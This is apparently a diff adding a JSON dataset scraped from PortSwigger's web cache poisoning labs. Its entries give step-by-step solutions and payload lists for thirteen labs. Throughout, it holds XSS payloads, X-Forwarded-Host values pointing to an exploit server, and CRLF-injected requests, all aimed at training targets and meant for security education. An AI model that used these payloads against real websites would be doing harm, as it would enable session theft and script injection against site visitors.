@@ -1,0 +1,327 @@
+[
+  {
+    "url": "https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities",
+    "category": "web-cache-poisoning",
+    "title": "Combining web cache poisoning vulnerabilities",
+    "description": "This lab is susceptible to web cache poisoning, but only if you construct a complex exploit chain.",
+    "solution_steps": [
+      "With Burp running, load the website's home page.",
+      "Use Param Miner to identify that the X-Forwarded-Host and X-Original-URL headers are supported.",
+      "In Burp Repeater, experiment with the X-Forwarded-Host header and observe that it can be used to import an arbitrary JSON file instead of the translations.json file, which contains translations of UI texts.",
+      "Notice that the website is vulnerable to DOM-XSS due to the way the initTranslations() function handles data from the JSON file for all languages except English.",
+      "Go to the exploit server and edit the file name to match the path used by the vulnerable website: /resources/json/translations.json",
+      "In the head, add the header Access-Control-Allow-Origin: * to enable CORS .",
+      "In the body, add malicious JSON that matches the structure used by the real translation file. Replace the value of one of the translations with a suitable XSS payload, for example: {\n    \"en\": {\n        \"name\": \"English\"\n    },\n    \"es\": {\n        \"name\": \"espa\u00f1ol\",\n        \"translations\": {\n            \"Return to list\": \"Volver a la lista\",\n            \"View details\": \"</a><img src=1 onerror='alert(document.cookie)' />\",\n            \"Description:\": \"Descripci\u00f3n\"\n        }\n    }\n} For the rest of this solution we will use Spanish to demonstrate the attack. Please note that if you injected your payload into the translation for another language, you will also need to adapt the examples accordingly.",
+      "Store the exploit.",
+      "In Burp, find a GET request for /?localized=1 that includes the lang cookie for Spanish: lang=es",
+      "Send the request to Burp Repeater. Add a cache buster and the following header, remembering to enter your own exploit server ID: X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "Send the response and confirm that your exploit server is reflected in the response.",
+      "To simulate the victim, load the URL in the browser and confirm that the alert() fires.",
+      "You have successfully poisoned the cache for the Spanish page, but the target user's language is set to English. As it's not possible to exploit users with their language set to English, you need to find a way to forcibly change their language.",
+      "In Burp, go to \"Proxy\" > \"HTTP history\" and study the requests and responses that you generated. Notice that when you change the language on the page to anything other than English, this triggers a redirect, for example, to /setlang/es . The user's selected language is set server side using the lang=es cookie, and the home page is reloaded with the parameter ?localized=1 .",
+      "Send the GET request for the home page to Burp Repeater and add a cache buster.",
+      "Observe that the X-Original-URL can be used to change the path of the request, so you can explicitly set /setlang/es . However, you will find that this response cannot be cached because it contains the Set-Cookie header.",
+      "Observe that the home page sometimes uses backslashes as a folder separator. Notice that the server normalizes these to forward slashes using a redirect. Therefore, X-Original-URL: /setlang\\es triggers a 302 response that redirects to /setlang/es . Observe that this 302 response is cacheable and, therefore, can be used to force other users to the Spanish version of the home page.",
+      "You now need to combine these two exploits. First, poison the GET /?localized=1 page using the X-Forwarded-Host header to import your malicious JSON file from the exploit server.",
+      "Now, while the cache is still poisoned, also poison the GET / page using X-Original-URL: /setlang\\es to force all users to the Spanish page.",
+      "To simulate the victim, load the English page in the browser and make sure that you are redirected and that the alert() fires.",
+      "Replay both requests in sequence to keep the cache poisoned on both pages until the victim visits the site and the lab is solved."
+    ],
+    "solution": "1. With Burp running, load the website's home page.\n2. Use Param Miner to identify that the X-Forwarded-Host and X-Original-URL headers are supported.\n3. In Burp Repeater, experiment with the X-Forwarded-Host header and observe that it can be used to import an arbitrary JSON file instead of the translations.json file, which contains translations of UI texts.\n4. Notice that the website is vulnerable to DOM-XSS due to the way the initTranslations() function handles data from the JSON file for all languages except English.\n5. Go to the exploit server and edit the file name to match the path used by the vulnerable website: /resources/json/translations.json\n6. In the head, add the header Access-Control-Allow-Origin: * to enable CORS .\n7. In the body, add malicious JSON that matches the structure used by the real translation file. Replace the value of one of the translations with a suitable XSS payload, for example: {\n    \"en\": {\n        \"name\": \"English\"\n    },\n    \"es\": {\n        \"name\": \"espa\u00f1ol\",\n        \"translations\": {\n            \"Return to list\": \"Volver a la lista\",\n            \"View details\": \"</a><img src=1 onerror='alert(document.cookie)' />\",\n            \"Description:\": \"Descripci\u00f3n\"\n        }\n    }\n} For the rest of this solution we will use Spanish to demonstrate the attack. Please note that if you injected your payload into the translation for another language, you will also need to adapt the examples accordingly.\n8. Store the exploit.\n9. In Burp, find a GET request for /?localized=1 that includes the lang cookie for Spanish: lang=es\n10. Send the request to Burp Repeater. Add a cache buster and the following header, remembering to enter your own exploit server ID: X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\n11. Send the response and confirm that your exploit server is reflected in the response.\n12. To simulate the victim, load the URL in the browser and confirm that the alert() fires.\n13. You have successfully poisoned the cache for the Spanish page, but the target user's language is set to English. As it's not possible to exploit users with their language set to English, you need to find a way to forcibly change their language.\n14. In Burp, go to \"Proxy\" > \"HTTP history\" and study the requests and responses that you generated. Notice that when you change the language on the page to anything other than English, this triggers a redirect, for example, to /setlang/es . The user's selected language is set server side using the lang=es cookie, and the home page is reloaded with the parameter ?localized=1 .\n15. Send the GET request for the home page to Burp Repeater and add a cache buster.\n16. Observe that the X-Original-URL can be used to change the path of the request, so you can explicitly set /setlang/es . However, you will find that this response cannot be cached because it contains the Set-Cookie header.\n17. Observe that the home page sometimes uses backslashes as a folder separator. Notice that the server normalizes these to forward slashes using a redirect. Therefore, X-Original-URL: /setlang\\es triggers a 302 response that redirects to /setlang/es . Observe that this 302 response is cacheable and, therefore, can be used to force other users to the Spanish version of the home page.\n18. You now need to combine these two exploits. First, poison the GET /?localized=1 page using the X-Forwarded-Host header to import your malicious JSON file from the exploit server.\n19. Now, while the cache is still poisoned, also poison the GET / page using X-Original-URL: /setlang\\es to force all users to the Spanish page.\n20. To simulate the victim, load the English page in the browser and make sure that you are redirected and that the alert() fires.\n21. Replay both requests in sequence to keep the cache poisoned on both pages until the victim visits the site and the lab is solved.",
+    "payloads": [
+      "alert(document.cookie)",
+      "X-Forwarded-Host",
+      "X-Original-URL",
+      "translations.json",
+      "initTranslations()",
+      "/resources/json/translations.json",
+      "Access-Control-Allow-Origin: *",
+      "{\n    \"en\": {\n        \"name\": \"English\"\n    },\n    \"es\": {\n        \"name\": \"espa\u00f1ol\",\n        \"translations\": {\n            \"Return to list\": \"Volver a la lista\",\n            \"View details\": \"</a><img src=1 onerror='alert(document.cookie)' />\",\n            \"Description:\": \"Descripci\u00f3n\"\n        }\n    }\n}",
+      "/?localized=1",
+      "lang",
+      "lang=es",
+      "X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "alert()",
+      "/setlang/es",
+      "?localized=1"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header",
+    "category": "web-cache-poisoning",
+    "title": "Targeted web cache poisoning using an unknown header",
+    "description": "This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executesalert(document.cookie)in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.",
+    "solution_steps": [
+      "With Burp running, load the website's home page.",
+      "In Burp, go to \"Proxy\" > \"HTTP history\" and study the requests and responses that you generated. Find the GET request for the home page.",
+      "With the Param Miner extension enabled, right-click on the request and select \"Guess headers\". After a while, Param Miner will report that there is a secret input in the form of the X-Host header.",
+      "Send the GET request to Burp Repeater and add a cache-buster query parameter.",
+      "Add the X-Host header with an arbitrary hostname, such as example.com . Notice that the value of this header is used to dynamically generate an absolute URL for importing the JavaScript file stored at /resources/js/tracking.js .",
+      "Go to the exploit server and change the file name to match the path used by the vulnerable response: /resources/js/tracking.js",
+      "In the body, enter the payload alert(document.cookie) and store the exploit.",
+      "Go back to the request in Burp Repeater and set the X-Host header as follows, remembering to add your own exploit server ID: X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.",
+      "To simulate the victim, load the URL in the browser and make sure that the alert() fires.",
+      "Notice that the Vary header is used to specify that the User-Agent is part of the cache key. To target the victim, you need to find out their User-Agent .",
+      "On the website, notice that the comment feature allows certain HTML tags. Post a comment containing a suitable payload to cause the victim's browser to interact with your exploit server, for example: <img src=\"https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo\" />",
+      "Go to the blog page and double-check that your comment was successfully posted.",
+      "Go to the exploit server and click the button to open the \"Access log\". Refresh the page every few seconds until you see requests made by a different user. This is the victim. Copy their User-Agent from the log.",
+      "Go back to your malicious request in Burp Repeater and paste the victim's User-Agent into the corresponding header. Remove the cache buster.",
+      "Keep sending the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.",
+      "Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved"
+    ],
+    "solution": "1. With Burp running, load the website's home page.\n2. In Burp, go to \"Proxy\" > \"HTTP history\" and study the requests and responses that you generated. Find the GET request for the home page.\n3. With the Param Miner extension enabled, right-click on the request and select \"Guess headers\". After a while, Param Miner will report that there is a secret input in the form of the X-Host header.\n4. Send the GET request to Burp Repeater and add a cache-buster query parameter.\n5. Add the X-Host header with an arbitrary hostname, such as example.com . Notice that the value of this header is used to dynamically generate an absolute URL for importing the JavaScript file stored at /resources/js/tracking.js .\n6. Go to the exploit server and change the file name to match the path used by the vulnerable response: /resources/js/tracking.js\n7. In the body, enter the payload alert(document.cookie) and store the exploit.\n8. Go back to the request in Burp Repeater and set the X-Host header as follows, remembering to add your own exploit server ID: X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\n9. Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.\n10. To simulate the victim, load the URL in the browser and make sure that the alert() fires.\n11. Notice that the Vary header is used to specify that the User-Agent is part of the cache key. To target the victim, you need to find out their User-Agent .\n12. On the website, notice that the comment feature allows certain HTML tags. Post a comment containing a suitable payload to cause the victim's browser to interact with your exploit server, for example: <img src=\"https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo\" />\n13. Go to the blog page and double-check that your comment was successfully posted.\n14. Go to the exploit server and click the button to open the \"Access log\". Refresh the page every few seconds until you see requests made by a different user. This is the victim. Copy their User-Agent from the log.\n15. Go back to your malicious request in Burp Repeater and paste the victim's User-Agent into the corresponding header. Remove the cache buster.\n16. Keep sending the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.\n17. Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved",
+    "payloads": [
+      "alert(document.cookie)",
+      "X-Host",
+      "example.com",
+      "/resources/js/tracking.js",
+      "X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "X-Cache: hit",
+      "alert()",
+      "Vary",
+      "User-Agent",
+      "<img src=\"https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo\" />"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria",
+    "category": "web-cache-poisoning",
+    "title": "Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria",
+    "description": "This lab contains a DOM-based vulnerability that can be exploited as part of a web cache poisoning attack. A user visits the home page roughly once a minute. Note that the cache used by this lab has stricter criteria for deciding which responses are cacheable, so you will need to study the cache behavior closely.",
+    "solution_steps": [
+      "With Burp running, open the website's home page.",
+      "In Burp, go to \"Proxy\" > \"HTTP history\" and study the requests and responses that you generated. Find the GET request for the home page and send it to Burp Repeater.",
+      "Use Param Miner to identify that the X-Forwarded-Host header is supported.",
+      "Add a cache buster to the request, as well as the X-Forwarded-Host header with an arbitrary hostname, such as example.com . Notice that this header overwrites the data.host variable, which is passed into the initGeoLocate() function.",
+      "Study the initGeoLocate() function in /resources/js/geolocate.js and notice that it is vulnerable to DOM-XSS due to the way it handles the incoming JSON data.",
+      "Go to the exploit server and change the file name to match the path used by the vulnerable response: /resources/json/geolocate.json",
+      "In the head, add the header Access-Control-Allow-Origin: * to enable CORS",
+      "In the body, add a malicious JSON object that matches the one used by the vulnerable website. However, replace the value with a suitable XSS payload, for example: {\n\"country\": \"<img src=1 onerror=alert(document.cookie) />\"\n}",
+      "Store the exploit.",
+      "Back in Burp, find the request for the home page and send it to Burp Repeater.",
+      "In Burp Repeater, add the following header, remembering to enter your own exploit server ID: X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.",
+      "If this doesn't work, notice that the response contains the Set-Cookie header. Responses containing this header are not cacheable on this site. Reload the home page to generate a new request, which should have a session cookie already set.",
+      "Send this new request to Burp Repeater and repeat the steps above until you successfully poison the cache.",
+      "To simulate the victim, load the URL in the browser and make sure that the alert() fires.",
+      "Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved"
+    ],
+    "solution": "1. With Burp running, open the website's home page.\n2. In Burp, go to \"Proxy\" > \"HTTP history\" and study the requests and responses that you generated. Find the GET request for the home page and send it to Burp Repeater.\n3. Use Param Miner to identify that the X-Forwarded-Host header is supported.\n4. Add a cache buster to the request, as well as the X-Forwarded-Host header with an arbitrary hostname, such as example.com . Notice that this header overwrites the data.host variable, which is passed into the initGeoLocate() function.\n5. Study the initGeoLocate() function in /resources/js/geolocate.js and notice that it is vulnerable to DOM-XSS due to the way it handles the incoming JSON data.\n6. Go to the exploit server and change the file name to match the path used by the vulnerable response: /resources/json/geolocate.json\n7. In the head, add the header Access-Control-Allow-Origin: * to enable CORS\n8. In the body, add a malicious JSON object that matches the one used by the vulnerable website. However, replace the value with a suitable XSS payload, for example: {\n\"country\": \"<img src=1 onerror=alert(document.cookie) />\"\n}\n9. Store the exploit.\n10. Back in Burp, find the request for the home page and send it to Burp Repeater.\n11. In Burp Repeater, add the following header, remembering to enter your own exploit server ID: X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\n12. Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.\n13. If this doesn't work, notice that the response contains the Set-Cookie header. Responses containing this header are not cacheable on this site. Reload the home page to generate a new request, which should have a session cookie already set.\n14. Send this new request to Burp Repeater and repeat the steps above until you successfully poison the cache.\n15. To simulate the victim, load the URL in the browser and make sure that the alert() fires.\n16. Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved",
+    "payloads": [
+      "alert(document.cookie)",
+      "X-Forwarded-Host",
+      "example.com",
+      "data.host",
+      "initGeoLocate()",
+      "/resources/js/geolocate.js",
+      "/resources/json/geolocate.json",
+      "Access-Control-Allow-Origin: *",
+      "{\n\"country\": \"<img src=1 onerror=alert(document.cookie) />\"\n}",
+      "X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "X-Cache: hit",
+      "Set-Cookie",
+      "alert()"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie",
+    "category": "web-cache-poisoning",
+    "title": "Web cache poisoning with an unkeyed cookie",
+    "description": "This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executesalert(1)in the visitor's browser.",
+    "solution_steps": [
+      "With Burp running, load the website's home page.",
+      "In Burp, go to \"Proxy\" > \"HTTP history\" and study the requests and responses that you generated. Notice that the first response you received sets the cookie fehost=prod-cache-01 .",
+      "Reload the home page and observe that the value from the fehost cookie is reflected inside a double-quoted JavaScript object in the response.",
+      "Send this request to Burp Repeater and add a cache-buster query parameter.",
+      "Change the value of the cookie to an arbitrary string and resend the request. Confirm that this string is reflected in the response.",
+      "Place a suitable XSS payload in the fehost cookie, for example: fehost=someString\"-alert(1)-\"someString",
+      "Replay the request until you see the payload in the response and X-Cache: hit in the headers.",
+      "Load the URL in the browser and confirm the alert() fires.",
+      "Go back Burp Repeater, remove the cache buster, and replay the request to keep the cache poisoned until the victim visits the site and the lab is solved."
+    ],
+    "solution": "1. With Burp running, load the website's home page.\n2. In Burp, go to \"Proxy\" > \"HTTP history\" and study the requests and responses that you generated. Notice that the first response you received sets the cookie fehost=prod-cache-01 .\n3. Reload the home page and observe that the value from the fehost cookie is reflected inside a double-quoted JavaScript object in the response.\n4. Send this request to Burp Repeater and add a cache-buster query parameter.\n5. Change the value of the cookie to an arbitrary string and resend the request. Confirm that this string is reflected in the response.\n6. Place a suitable XSS payload in the fehost cookie, for example: fehost=someString\"-alert(1)-\"someString\n7. Replay the request until you see the payload in the response and X-Cache: hit in the headers.\n8. Load the URL in the browser and confirm the alert() fires.\n9. Go back Burp Repeater, remove the cache buster, and replay the request to keep the cache poisoned until the victim visits the site and the lab is solved.",
+    "payloads": [
+      "alert(1)",
+      "fehost=prod-cache-01",
+      "fehost",
+      "fehost=someString\"-alert(1)-\"someString",
+      "X-Cache: hit",
+      "alert()"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header",
+    "category": "web-cache-poisoning",
+    "title": "Web cache poisoning with an unkeyed header",
+    "description": "This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executesalert(document.cookie)in the visitor's browser.",
+    "solution": "This lab supports the\nX-Forwarded-Host\nheader.",
+    "payloads": [
+      "alert(document.cookie)",
+      "X-Forwarded-Host",
+      "?cb=1234",
+      "example.com",
+      "/resources/js/tracking.js",
+      "X-Cache: hit",
+      "X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "alert()"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers",
+    "category": "web-cache-poisoning",
+    "title": "Web cache poisoning with multiple headers",
+    "description": "This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executesalert(document.cookie)in the visitor's browser.",
+    "solution": "This lab supports both the\nX-Forwarded-Host\nand\nX-Forwarded-Scheme\nheaders.",
+    "payloads": [
+      "alert(document.cookie)",
+      "X-Forwarded-Host",
+      "X-Forwarded-Scheme",
+      "/resources/js/tracking.js",
+      "example.com",
+      "HTTPS",
+      "Location",
+      "https://",
+      "X-Forwarded-Host: example.com",
+      "X-Forwarded-Scheme: nothttps",
+      "https://example.com/",
+      "X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "X-Cache: hit",
+      "alert()"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection",
+    "category": "web-cache-poisoning",
+    "title": "Cache key injection",
+    "description": "This lab contains multiple independent vulnerabilities, including cache key injection. A user regularly visits this site's home page using Chrome.",
+    "solution": "Solving this lab requires an understanding of several other web vulnerabilities. If you're still having trouble solving it after several hours, we recommend completing all other topics on the\nWeb Security Academy\nfirst.",
+    "payloads": [
+      "alert(1)",
+      "Pragma: x-get-cache-key",
+      "/login",
+      "utm_content",
+      "lang",
+      "/login?lang=en?utm_content=anything",
+      "/login/",
+      "/js/localize.js",
+      "Origin",
+      "cors",
+      "GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2\nOrigin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$\n\nGET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2",
+      "/login?lang=en"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get",
+    "category": "web-cache-poisoning",
+    "title": "Web cache poisoning via a fat GET request",
+    "description": "This lab is vulnerable to web cache poisoning. It acceptsGETrequests that have a body, but does not include the body in the cache key. A user regularly visits this site's home page using Chrome.",
+    "solution_steps": [
+      "Observe that every page imports the script /js/geolocate.js , executing the callback function setCountryCookie() . Send the request GET /js/geolocate.js?callback=setCountryCookie to Burp Repeater.",
+      "Notice that you can control the name of the function that is called in the response by passing in a duplicate callback parameter via the request body. Also notice that the cache key is still derived from the original callback parameter in the request line: GET /js/geolocate.js?callback=setCountryCookie\n\u2026\ncallback=arbitraryFunction\n\nHTTP/1.1 200 OK\nX-Cache-Key: /js/geolocate.js?callback=setCountryCookie\n\u2026\narbitraryFunction({\"country\" : \"United Kingdom\"})",
+      "Send the request again, but this time pass in alert(1) as the callback function. Check that you can successfully poison the cache.",
+      "Remove any cache busters and re-poison the cache. The lab will solve when the victim user visits any page containing this resource import URL."
+    ],
+    "solution": "1. Observe that every page imports the script /js/geolocate.js , executing the callback function setCountryCookie() . Send the request GET /js/geolocate.js?callback=setCountryCookie to Burp Repeater.\n2. Notice that you can control the name of the function that is called in the response by passing in a duplicate callback parameter via the request body. Also notice that the cache key is still derived from the original callback parameter in the request line: GET /js/geolocate.js?callback=setCountryCookie\n\u2026\ncallback=arbitraryFunction\n\nHTTP/1.1 200 OK\nX-Cache-Key: /js/geolocate.js?callback=setCountryCookie\n\u2026\narbitraryFunction({\"country\" : \"United Kingdom\"})\n3. Send the request again, but this time pass in alert(1) as the callback function. Check that you can successfully poison the cache.\n4. Remove any cache busters and re-poison the cache. The lab will solve when the victim user visits any page containing this resource import URL.",
+    "payloads": [
+      "alert(1)",
+      "/js/geolocate.js",
+      "setCountryCookie()",
+      "GET /js/geolocate.js?callback=setCountryCookie",
+      "callback",
+      "GET /js/geolocate.js?callback=setCountryCookie\n\u2026\ncallback=arbitraryFunction\n\nHTTP/1.1 200 OK\nX-Cache-Key: /js/geolocate.js?callback=setCountryCookie\n\u2026\narbitraryFunction({\"country\" : \"United Kingdom\"})"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal",
+    "category": "web-cache-poisoning",
+    "title": "Internal cache poisoning",
+    "description": "This lab is vulnerable to web cache poisoning. It uses multiple layers of caching. A user regularly visits this site's home page using Chrome.",
+    "solution_steps": [
+      "Notice that the home page is a suitable cache oracle and send the GET / request to Burp Repeater.",
+      "Observe that any changes to the query string are always reflected in the response. This indicates that the external cache includes this in the cache key. Use Param Miner to add a dynamic cache-buster query parameter. This will allow you to bypass the external cache.",
+      "Observe that the X-Forwarded-Host header is supported. Add this to your request, containing your exploit server URL: X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "Send the request. If you get lucky with your timing, you will notice that your exploit server URL is reflected three times in the response. However, most of the time, you will see that the URL for the canonical link element and the analytics.js import now both point to your exploit server, but the geolocate.js import URL remains the same.",
+      "Keep sending the request. Eventually, the URL for the geolocate.js resource will also be overwritten with your exploit server URL. This indicates that this fragment is being cached separately by the internal cache. Notice that you've been getting a cache hit for this fragment even with the cache-buster query parameter - the query string is unkeyed by the internal cache.",
+      "Remove the X-Forwarded-Host header and resend the request. Notice that the internally cached fragment still reflects your exploit server URL, but the other two URLs do not. This indicates that the header is unkeyed by the internal cache but keyed by the external one. Therefore, you can poison the internally cached fragment using this header.",
+      "Go to the exploit server and create a file at /js/geolocate.js containing the payload alert(document.cookie) . Store the exploit.",
+      "Back in Burp Repeater, disable the dynamic cache buster in the query string and re-add the X-Forwarded-Host header to point to your exploit server.",
+      "Send the request over and over until all three of the dynamic URLs in the response point to your exploit server. Keep replaying the request to keep the cache poisoned until the victim user visits the page and the lab is solved."
+    ],
+    "solution": "1. Notice that the home page is a suitable cache oracle and send the GET / request to Burp Repeater.\n2. Observe that any changes to the query string are always reflected in the response. This indicates that the external cache includes this in the cache key. Use Param Miner to add a dynamic cache-buster query parameter. This will allow you to bypass the external cache.\n3. Observe that the X-Forwarded-Host header is supported. Add this to your request, containing your exploit server URL: X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\n4. Send the request. If you get lucky with your timing, you will notice that your exploit server URL is reflected three times in the response. However, most of the time, you will see that the URL for the canonical link element and the analytics.js import now both point to your exploit server, but the geolocate.js import URL remains the same.\n5. Keep sending the request. Eventually, the URL for the geolocate.js resource will also be overwritten with your exploit server URL. This indicates that this fragment is being cached separately by the internal cache. Notice that you've been getting a cache hit for this fragment even with the cache-buster query parameter - the query string is unkeyed by the internal cache.\n6. Remove the X-Forwarded-Host header and resend the request. Notice that the internally cached fragment still reflects your exploit server URL, but the other two URLs do not. This indicates that the header is unkeyed by the internal cache but keyed by the external one. Therefore, you can poison the internally cached fragment using this header.\n7. Go to the exploit server and create a file at /js/geolocate.js containing the payload alert(document.cookie) . Store the exploit.\n8. Back in Burp Repeater, disable the dynamic cache buster in the query string and re-add the X-Forwarded-Host header to point to your exploit server.\n9. Send the request over and over until all three of the dynamic URLs in the response point to your exploit server. Keep replaying the request to keep the cache poisoned until the victim user visits the page and the lab is solved.",
+    "payloads": [
+      "alert(document.cookie)",
+      "GET /",
+      "X-Forwarded-Host",
+      "X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "analytics.js",
+      "geolocate.js",
+      "/js/geolocate.js"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization",
+    "category": "web-cache-poisoning",
+    "title": "URL normalization",
+    "description": "This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.",
+    "solution_steps": [
+      "In Burp Repeater, browse to any non-existent path, such as GET /random . Notice that the path you requested is reflected in the error message.",
+      "Add a suitable reflected XSS payload to the request line: GET /random</p><script>alert(1)</script><p>foo",
+      "Notice that if you request this URL in the browser, the payload doesn't execute because it is URL-encoded.",
+      "In Burp Repeater, poison the cache with your payload and then immediately load the URL in the browser. This time, the alert() is executed because the browser's encoded payload was URL-decoded by the cache, causing a cache hit with the earlier request.",
+      "Re-poison the cache then immediately go to the lab and click \"Deliver link to victim\". Submit your malicious URL. The lab will be solved when the victim visits the link."
+    ],
+    "solution": "1. In Burp Repeater, browse to any non-existent path, such as GET /random . Notice that the path you requested is reflected in the error message.\n2. Add a suitable reflected XSS payload to the request line: GET /random</p><script>alert(1)</script><p>foo\n3. Notice that if you request this URL in the browser, the payload doesn't execute because it is URL-encoded.\n4. In Burp Repeater, poison the cache with your payload and then immediately load the URL in the browser. This time, the alert() is executed because the browser's encoded payload was URL-decoded by the cache, causing a cache hit with the earlier request.\n5. Re-poison the cache then immediately go to the lab and click \"Deliver link to victim\". Submit your malicious URL. The lab will be solved when the victim visits the link.",
+    "payloads": [
+      "alert(1)",
+      "GET /random",
+      "GET /random</p><script>alert(1)</script><p>foo",
+      "alert()"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking",
+    "category": "web-cache-poisoning",
+    "title": "Parameter cloaking",
+    "description": "This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome.",
+    "solution": "The website excludes a certain UTM analytics parameter.",
+    "payloads": [
+      "alert(1)",
+      "utm_content",
+      "/js/geolocate.js",
+      "setCountryCookie()",
+      "GET /js/geolocate.js?callback=setCountryCookie",
+      "callback",
+      "GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction\n\nHTTP/1.1 200 OK\nX-Cache-Key: /js/geolocate.js?callback=setCountryCookie\n\u2026\narbitraryFunction({\"country\" : \"United Kingdom\"})",
+      "GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)",
+      "alert()"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param",
+    "category": "web-cache-poisoning",
+    "title": "Web cache poisoning via an unkeyed query parameter",
+    "description": "This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome.",
+    "solution": "Websites often exclude certain UTM analytics parameters from the cache key.",
+    "payloads": [
+      "alert(1)",
+      "utm_content",
+      "GET /?utm_content='/><script>alert(1)</script>",
+      "alert()"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query",
+    "category": "web-cache-poisoning",
+    "title": "Web cache poisoning via an unkeyed query string",
+    "description": "This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.",
+    "solution": "If you're struggling, you can use the\nPragma: x-get-cache-key\nheader to display the cache key in the response. This applies to some of the other labs as well.\nAlthough you can't use a query parameter as a cache buster, there is a common request header that will be keyed if present. You can use the\nParam Miner\nextension to automatically add a cache buster header to your requests.",
+    "payloads": [
+      "alert(1)",
+      "Pragma: x-get-cache-key",
+      "Origin",
+      "GET /?evil='/><script>alert(1)</script>",
+      "X-Cache: hit"
+    ]
+  }
+]
